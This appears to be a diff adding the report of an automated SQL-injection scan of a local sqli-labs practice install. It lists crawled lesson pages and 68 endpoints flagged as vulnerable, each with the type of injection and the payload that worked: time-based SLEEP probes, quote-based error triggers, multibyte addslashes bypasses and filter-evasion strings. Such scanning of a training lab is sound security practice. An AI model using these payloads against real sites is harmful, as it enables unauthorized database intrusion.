@@ -1,0 +1,453 @@
+3W-Scanner
+___________________
+Date: 2020-01-10
+Time: 16:55:37.626787
+___________________
+Base URL: http://192.168.6.1/sqli-labs-master/
+Robots.txt: 
+Max-Crawl: 0
+Login URL: None
+Scan Option: sql
+Time Taken: 18.50 mins
+________________________
+- CRAWLED URLS ( found: 89 links, crawled: 76 links, invalid: 11 links, time taken: 18.50 mins)
+ID: 1
+FROM: http://192.168.6.1/sqli-labs-master/
+URL:
+- Title: Less-19 Header Injection- Referer- Error Based- string  ==>  http://192.168.6.1/sqli-labs-master/Less-19
+- Title: Less-20 Cookie Injection- Error Based- string  ==>  http://192.168.6.1/sqli-labs-master/Less-20
+- Title: Less-17 Update Query- Error based - String  ==>  http://192.168.6.1/sqli-labs-master/Less-17
+- Title: Less-18 Header Injection- Error Based- string  ==>  http://192.168.6.1/sqli-labs-master/Less-18
+- Title: Less-15- Blind- Boolian Based- String  ==>  http://192.168.6.1/sqli-labs-master/Less-15
+- Title: Less-16- Blind- Time Based- Double quotes- String  ==>  http://192.168.6.1/sqli-labs-master/Less-16
+- Title: Less-13- Double Injection- String- with twist  ==>  http://192.168.6.1/sqli-labs-master/Less-13
+- Title: Less-14- Double Injection- Double quotes- String  ==>  http://192.168.6.1/sqli-labs-master/Less-14
+- Title: Less-11- Error Based- String  ==>  http://192.168.6.1/sqli-labs-master/Less-11
+- Title: Less-12- Error Based- Double quotes- String  ==>  http://192.168.6.1/sqli-labs-master/Less-12
+- Title: Less-9 Blind- Time based- Single Quotes- String  ==>  http://192.168.6.1/sqli-labs-master/Less-9?id=1
+- Title: Less-10 Blind- Time based- Double Quotes- String  ==>  http://192.168.6.1/sqli-labs-master/Less-10?id=1
+- Title: Less-7 Dump into Outfile  ==>  http://192.168.6.1/sqli-labs-master/Less-7?id=1
+- Title: Less-8 Blind- Boolian- Single Quotes- String  ==>  http://192.168.6.1/sqli-labs-master/Less-8?id=1
+- Title: Less-5 Double Query- Single Quotes- String  ==>  http://192.168.6.1/sqli-labs-master/Less-5?id=1
+- Title: Less-6 Double Query- Double Quotes- String  ==>  http://192.168.6.1/sqli-labs-master/Less-6?id=1
+- Title: Less-3 Error Based- String (with Twist)   ==>  http://192.168.6.1/sqli-labs-master/Less-3?id=1
+- Title: Less-1 **Error Based- String**  ==>  http://192.168.6.1/sqli-labs-master/Less-1?id=1
+- Title: Less-4 Error Based- DoubleQuotes String  ==>  http://192.168.6.1/sqli-labs-master/Less-4?id=1
+- Title: Less-2 **Error Based- Intiger**  ==>  http://192.168.6.1/sqli-labs-master/Less-2?id=1
+- Title: SQL Injections-Page-4  ==>  http://192.168.6.1/sqli-labs-master/index-3.html
+- Title: SQL Injections-Page-3  ==>  http://192.168.6.1/sqli-labs-master/index-2.html
+- Title: SQL Injections-Page-2  ==>  http://192.168.6.1/sqli-labs-master/index-1.html
+ID: 2
+FROM: http://192.168.6.1/sqli-labs-master/index-1.html/
+URL:
+- Title: Less-37- MySQL_real_escape_string  ==>  http://192.168.6.1/sqli-labs-master/Less-37
+- Title: Less-35 **why care for addslashes()**  ==>  http://192.168.6.1/sqli-labs-master/Less-35?id=1
+- Title: Less-36 **Bypass MySQL Real Escape String**  ==>  http://192.168.6.1/sqli-labs-master/Less-36?id=1
+- Title: Less-32 **Bypass addslashes()**  ==>  http://192.168.6.1/sqli-labs-master/Less-33?id=1
+- Title: Less-34- Bypass Add SLASHES  ==>  http://192.168.6.1/sqli-labs-master/Less-34
+- Title: Less-31 FUN with WAF  ==>  http://192.168.6.1/sqli-labs-master/Less-31?id=1
+- Title: Less-32 **Bypass addslashes()**  ==>  http://192.168.6.1/sqli-labs-master/Less-32?id=1
+- Title: Less-29 Protection with WAF  ==>  http://192.168.6.1/sqli-labs-master/Less-29?id=1
+- Title: Less-30  ==>  http://192.168.6.1/sqli-labs-master/Less-30?id=1
+- Title: Less-28 Trick with SELECT & UNION  ==>  http://192.168.6.1/sqli-labs-master/Less-28?id=1
+- Title: Less-28a Trick with SELECT & UNION  ==>  http://192.168.6.1/sqli-labs-master/Less-28a?id=1
+- Title: Less-27 Trick with SELECT & UNION  ==>  http://192.168.6.1/sqli-labs-master/Less-27?id=1
+- Title: Less-27 Trick with SELECT & UNION  ==>  http://192.168.6.1/sqli-labs-master/Less-27a?id=1
+- Title: Less-26 Trick with comments  ==>  http://192.168.6.1/sqli-labs-master/Less-26?id=1
+- Title: Less-26a Trick with comments  ==>  http://192.168.6.1/sqli-labs-master/Less-26a?id=1
+- Title: Less-25 Trick with OR & AND  ==>  http://192.168.6.1/sqli-labs-master/Less-25?id=1
+- Title: Less-25a Trick with OR & AND Blind  ==>  http://192.168.6.1/sqli-labs-master/Less-25a?id=1
+- Title: Less-23 **Error Based- no comments**  ==>  http://192.168.6.1/sqli-labs-master/Less-23?id=1
+- Title: Less-21 Cookie Injection- Error Based- complex - string  ==>  http://192.168.6.1/sqli-labs-master/Less-21
+- Title: Less-24 - Second Degree Injections   ==>  http://192.168.6.1/sqli-labs-master/Less-24
+- Title: Less-22 Cookie Injection- Error Based- Double Quotes - string  ==>  http://192.168.6.1/sqli-labs-master/Less-22
+ID: 3
+FROM: http://192.168.6.1/sqli-labs-master/index-2.html/
+URL:
+- Title: ORDER BY Clause Blind based  ==>  http://192.168.6.1/sqli-labs-master/Less-53?sort=1
+- Title: ORDER BY Clause Blind based  ==>  http://192.168.6.1/sqli-labs-master/Less-52?sort=1
+- Title: ORDER BY Clause Blind based  ==>  http://192.168.6.1/sqli-labs-master/Less-50?sort=1
+- Title: ORDER BY Clause Blind based  ==>  http://192.168.6.1/sqli-labs-master/Less-51?sort=1
+- Title: ORDER BY Clause Blind based  ==>  http://192.168.6.1/sqli-labs-master/Less-48?sort=1
+- Title: ORDER BY Clause Blind based  ==>  http://192.168.6.1/sqli-labs-master/Less-49?sort=1
+- Title: ORDER BY-Error-Numeric  ==>  http://192.168.6.1/sqli-labs-master/Less-46?sort=1
+- Title: ORDER BY Clause-Error-Single quote  ==>  http://192.168.6.1/sqli-labs-master/Less-47?sort=1
+- Title: Less-44 - Stacked Query blind   ==>  http://192.168.6.1/sqli-labs-master/Less-44
+- Title: Less-45 - Stacked Query Blind based twist  ==>  http://192.168.6.1/sqli-labs-master/Less-45
+- Title: Less-42 - Stacked Query error based   ==>  http://192.168.6.1/sqli-labs-master/Less-42
+- Title: Less-42 - Stacked Query   ==>  http://192.168.6.1/sqli-labs-master/Less-43
+- Title: Less-40 **stacked Query String type Blind**  ==>  http://192.168.6.1/sqli-labs-master/Less-40?id=1
+- Title: Less-38 **stacked Query**  ==>  http://192.168.6.1/sqli-labs-master/Less-38?id=1
+- Title: Less-41 **stacked Query Intiger type blind**  ==>  http://192.168.6.1/sqli-labs-master/Less-41?id=1
+- Title: Less-39 **stacked Query Intiger type**  ==>  http://192.168.6.1/sqli-labs-master/Less-39?id=1
+ID: 4
+FROM: http://192.168.6.1/sqli-labs-master/index-3.html/
+URL:
+- Title: Less-64:Challenge-11  ==>  http://192.168.6.1/sqli-labs-master/Less-64?id=1
+- Title: Less-65:Challenge-12  ==>  http://192.168.6.1/sqli-labs-master/Less-65?id=1
+- Title: Less-62:Challenge-9  ==>  http://192.168.6.1/sqli-labs-master/Less-62?id=1
+- Title: Less-63:Challenge-10  ==>  http://192.168.6.1/sqli-labs-master/Less-63?id=1
+- Title: Less-60:Challenge-7  ==>  http://192.168.6.1/sqli-labs-master/Less-60?id=1
+- Title: Less-61:Challenge-8  ==>  http://192.168.6.1/sqli-labs-master/Less-61?id=1
+- Title: Less-58:Challenge-5  ==>  http://192.168.6.1/sqli-labs-master/Less-58?id=1
+- Title: Less-59:Challenge-6  ==>  http://192.168.6.1/sqli-labs-master/Less-59?id=1
+- Title: Less-56:Challenge-3  ==>  http://192.168.6.1/sqli-labs-master/Less-56?id=1
+- Title: Less-54:Challenge-1  ==>  http://192.168.6.1/sqli-labs-master/Less-54?id=1
+- Title: Less-57:Challenge-4  ==>  http://192.168.6.1/sqli-labs-master/Less-57?id=1
+- Title: Less-55:Challenge-2  ==>  http://192.168.6.1/sqli-labs-master/Less-55?id=1
+ID: 5
+FROM: http://192.168.6.1/sqli-labs-master/Less-44/
+URL:
+- Title: 
+Account Create
+  ==>  http://192.168.6.1/sqli-labs-master/Less-44/acc-create.php
+ID: 6
+FROM: http://192.168.6.1/sqli-labs-master/Less-24/
+URL:
+- Title: NO-TITLE  ==>  http://192.168.6.1/sqli-labs-master/Less-24/login.php
+- Title: New User   ==>  http://192.168.6.1/sqli-labs-master/Less-24/new_user.php
+- Title: 
+Forgot Password
+  ==>  http://192.168.6.1/sqli-labs-master/Less-24/forgot_password.php
+
+
+________________________
+- SQL Injection Testing ( found 68 vulnerable pages, time taken: 18.47 mins )
+INDEX: 1
+URL: http://192.168.6.1/sqli-labs-master/Less-19
+TYPE: error-based-post(http-header)
+PAYLOAD: '
+
+INDEX: 2
+URL: http://192.168.6.1/sqli-labs-master/Less-20
+TYPE: error-based-get(cookie)
+PAYLOAD: '
+
+INDEX: 3
+URL: http://192.168.6.1/sqli-labs-master/Less-17
+TYPE: error-based-post
+PAYLOAD: '
+
+INDEX: 4
+URL: http://192.168.6.1/sqli-labs-master/Less-18
+TYPE: error-based-post(http-header)
+PAYLOAD: '
+
+INDEX: 5
+URL: http://192.168.6.1/sqli-labs-master/Less-15
+TYPE: time-based-post
+PAYLOAD: ' AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe
+
+INDEX: 6
+URL: http://192.168.6.1/sqli-labs-master/Less-16
+TYPE: time-based-post
+PAYLOAD: ' SLEEP(1)/*' or SLEEP(1) or '" or SLEEP(1) or "*/
+
+INDEX: 7
+URL: http://192.168.6.1/sqli-labs-master/Less-13
+TYPE: error-based-post
+PAYLOAD: '"
+
+INDEX: 8
+URL: http://192.168.6.1/sqli-labs-master/Less-14
+TYPE: error-based-post
+PAYLOAD: '"
+
+INDEX: 9
+URL: http://192.168.6.1/sqli-labs-master/Less-11
+TYPE: error-based-post
+PAYLOAD: '"
+
+INDEX: 10
+URL: http://192.168.6.1/sqli-labs-master/Less-12
+TYPE: error-based-post
+PAYLOAD: '"
+
+INDEX: 11
+URL: http://192.168.6.1/sqli-labs-master/Less-37
+TYPE: error-based-post
+PAYLOAD: �'
+INDEX: 12
+URL: http://192.168.6.1/sqli-labs-master/Less-34
+TYPE: error-based-post
+PAYLOAD: �'
+INDEX: 13
+URL: http://192.168.6.1/sqli-labs-master/Less-21
+TYPE: error-based-get(cookie)
+PAYLOAD: ' and (select substring(@@version,3,1))='c'
+
+INDEX: 14
+URL: http://192.168.6.1/sqli-labs-master/Less-22
+TYPE: error-based-get(cookie)
+PAYLOAD: ' AS INJECTX WHERE 1=1 AND 1=1
+
+INDEX: 15
+URL: http://192.168.6.1/sqli-labs-master/Less-44
+TYPE: time-based-post
+PAYLOAD: ' AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe
+
+INDEX: 16
+URL: http://192.168.6.1/sqli-labs-master/Less-45
+TYPE: time-based-post
+PAYLOAD: ' AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe
+
+INDEX: 17
+URL: http://192.168.6.1/sqli-labs-master/Less-42
+TYPE: error-based-post
+PAYLOAD: '
+
+INDEX: 18
+URL: http://192.168.6.1/sqli-labs-master/Less-43
+TYPE: error-based-post
+PAYLOAD: '
+
+INDEX: 19
+URL: http://192.168.6.1/sqli-labs-master/Less-9?id=1
+TYPE: time-based-get
+PAYLOAD: ' AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe
+
+INDEX: 20
+URL: http://192.168.6.1/sqli-labs-master/Less-10?id=1
+TYPE: time-based-get
+PAYLOAD: "%20or%20sleep(5)%20--+
+INDEX: 21
+URL: http://192.168.6.1/sqli-labs-master/Less-7?id=1
+TYPE: error-based-get
+PAYLOAD: '
+
+INDEX: 22
+URL: http://192.168.6.1/sqli-labs-master/Less-8?id=1
+TYPE: time-based-get
+PAYLOAD: ' AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe
+
+INDEX: 23
+URL: http://192.168.6.1/sqli-labs-master/Less-5?id=1
+TYPE: error-based-get
+PAYLOAD: '
+
+INDEX: 24
+URL: http://192.168.6.1/sqli-labs-master/Less-6?id=1
+TYPE: error-based-get
+PAYLOAD: "
+
+INDEX: 25
+URL: http://192.168.6.1/sqli-labs-master/Less-3?id=1
+TYPE: error-based-get
+PAYLOAD: '
+
+INDEX: 26
+URL: http://192.168.6.1/sqli-labs-master/Less-1?id=1
+TYPE: error-based-get
+PAYLOAD: '
+
+INDEX: 27
+URL: http://192.168.6.1/sqli-labs-master/Less-4?id=1
+TYPE: error-based-get
+PAYLOAD: "
+
+INDEX: 28
+URL: http://192.168.6.1/sqli-labs-master/Less-2?id=1
+TYPE: error-based-get
+PAYLOAD: '
+
+INDEX: 29
+URL: http://192.168.6.1/sqli-labs-master/Less-35?id=1
+TYPE: error-based-get
+PAYLOAD: '
+
+INDEX: 30
+URL: http://192.168.6.1/sqli-labs-master/Less-36?id=1
+TYPE: error-based-get
+PAYLOAD: %df%27
+
+INDEX: 31
+URL: http://192.168.6.1/sqli-labs-master/Less-33?id=1
+TYPE: error-based-get
+PAYLOAD: %df%27
+
+INDEX: 32
+URL: http://192.168.6.1/sqli-labs-master/Less-31?id=1
+TYPE: time-based-get
+PAYLOAD: " and sleep(5) and "1"="1
+
+INDEX: 33
+URL: http://192.168.6.1/sqli-labs-master/Less-32?id=1
+TYPE: bool-based-get
+PAYLOAD: %df%27%20and%201=2%23_____%df%27%20and%201=1%23
+
+INDEX: 34
+URL: http://192.168.6.1/sqli-labs-master/Less-29?id=1
+TYPE: error-based-get
+PAYLOAD: '
+
+INDEX: 35
+URL: http://192.168.6.1/sqli-labs-master/Less-30?id=1
+TYPE: time-based-get
+PAYLOAD: "%20or%20sleep(5)%20--+
+INDEX: 36
+URL: http://192.168.6.1/sqli-labs-master/Less-28?id=1
+TYPE: error-based-get
+PAYLOAD: '
+
+INDEX: 37
+URL: http://192.168.6.1/sqli-labs-master/Less-28a?id=1
+TYPE: time-based-get
+PAYLOAD: ' AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe
+
+INDEX: 38
+URL: http://192.168.6.1/sqli-labs-master/Less-27?id=1
+TYPE: error-based-get
+PAYLOAD: '
+
+INDEX: 39
+URL: http://192.168.6.1/sqli-labs-master/Less-27a?id=1
+TYPE: bool-based-get
+PAYLOAD: "%0Aand%0A"1"="2_____"%0Aand%0A"1"="1
+
+INDEX: 40
+URL: http://192.168.6.1/sqli-labs-master/Less-26?id=1
+TYPE: error-based-get
+PAYLOAD: '
+
+INDEX: 41
+URL: http://192.168.6.1/sqli-labs-master/Less-26a?id=1
+TYPE: time-based-get
+PAYLOAD: ')%a0anandd%a0sleep(5)%a0anandd%a0('1')=('1
+
+INDEX: 42
+URL: http://192.168.6.1/sqli-labs-master/Less-25?id=1
+TYPE: error-based-get
+PAYLOAD: '
+
+INDEX: 43
+URL: http://192.168.6.1/sqli-labs-master/Less-25a?id=1
+TYPE: bool-based-get
+PAYLOAD:  aandnd 1=2_____ aandnd 1=1
+
+INDEX: 44
+URL: http://192.168.6.1/sqli-labs-master/Less-23?id=1
+TYPE: error-based-get
+PAYLOAD: '
+
+INDEX: 45
+URL: http://192.168.6.1/sqli-labs-master/Less-53?sort=1
+TYPE: time-based-get
+PAYLOAD: ' AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe
+
+INDEX: 46
+URL: http://192.168.6.1/sqli-labs-master/Less-52?sort=1
+TYPE: time-based-get
+PAYLOAD:  and sleep(5)
+
+INDEX: 47
+URL: http://192.168.6.1/sqli-labs-master/Less-50?sort=1
+TYPE: error-based-get
+PAYLOAD: '
+
+INDEX: 48
+URL: http://192.168.6.1/sqli-labs-master/Less-51?sort=1
+TYPE: error-based-get
+PAYLOAD: '
+
+INDEX: 49
+URL: http://192.168.6.1/sqli-labs-master/Less-48?sort=1
+TYPE: time-based-get
+PAYLOAD:  and sleep(5)
+
+INDEX: 50
+URL: http://192.168.6.1/sqli-labs-master/Less-49?sort=1
+TYPE: time-based-get
+PAYLOAD: ' AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe
+
+INDEX: 51
+URL: http://192.168.6.1/sqli-labs-master/Less-46?sort=1
+TYPE: error-based-get
+PAYLOAD: '
+
+INDEX: 52
+URL: http://192.168.6.1/sqli-labs-master/Less-47?sort=1
+TYPE: error-based-get
+PAYLOAD: '
+
+INDEX: 53
+URL: http://192.168.6.1/sqli-labs-master/Less-40?id=1
+TYPE: time-based-get
+PAYLOAD: ' AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe
+
+INDEX: 54
+URL: http://192.168.6.1/sqli-labs-master/Less-38?id=1
+TYPE: error-based-get
+PAYLOAD: '
+
+INDEX: 55
+URL: http://192.168.6.1/sqli-labs-master/Less-41?id=1
+TYPE: time-based-get
+PAYLOAD:  and sleep(5)
+
+INDEX: 56
+URL: http://192.168.6.1/sqli-labs-master/Less-39?id=1
+TYPE: error-based-get
+PAYLOAD: '
+
+INDEX: 57
+URL: http://192.168.6.1/sqli-labs-master/Less-64?id=1
+TYPE: time-based-get
+PAYLOAD:  and sleep(5)
+
+INDEX: 58
+URL: http://192.168.6.1/sqli-labs-master/Less-65?id=1
+TYPE: time-based-get
+PAYLOAD: " and sleep(5) and "1"="1
+
+INDEX: 59
+URL: http://192.168.6.1/sqli-labs-master/Less-62?id=1
+TYPE: time-based-get
+PAYLOAD: ' AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe
+
+INDEX: 60
+URL: http://192.168.6.1/sqli-labs-master/Less-63?id=1
+TYPE: time-based-get
+PAYLOAD: ' AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe
+
+INDEX: 61
+URL: http://192.168.6.1/sqli-labs-master/Less-60?id=1
+TYPE: error-based-get
+PAYLOAD: "
+
+INDEX: 62
+URL: http://192.168.6.1/sqli-labs-master/Less-61?id=1
+TYPE: error-based-get
+PAYLOAD: '
+
+INDEX: 63
+URL: http://192.168.6.1/sqli-labs-master/Less-58?id=1
+TYPE: error-based-get
+PAYLOAD: '
+
+INDEX: 64
+URL: http://192.168.6.1/sqli-labs-master/Less-59?id=1
+TYPE: error-based-get
+PAYLOAD: '
+
+INDEX: 65
+URL: http://192.168.6.1/sqli-labs-master/Less-56?id=1
+TYPE: time-based-get
+PAYLOAD: ' AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe
+
+INDEX: 66
+URL: http://192.168.6.1/sqli-labs-master/Less-54?id=1
+TYPE: time-based-get
+PAYLOAD: ' AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe
+
+INDEX: 67
+URL: http://192.168.6.1/sqli-labs-master/Less-57?id=1
+TYPE: time-based-get
+PAYLOAD: "%20or%20sleep(5)%20--+
+
+INDEX: 68
+URL: http://192.168.6.1/sqli-labs-master/Less-55?id=1
+TYPE: time-based-get
+PAYLOAD:  and sleep(5)
+
+
+
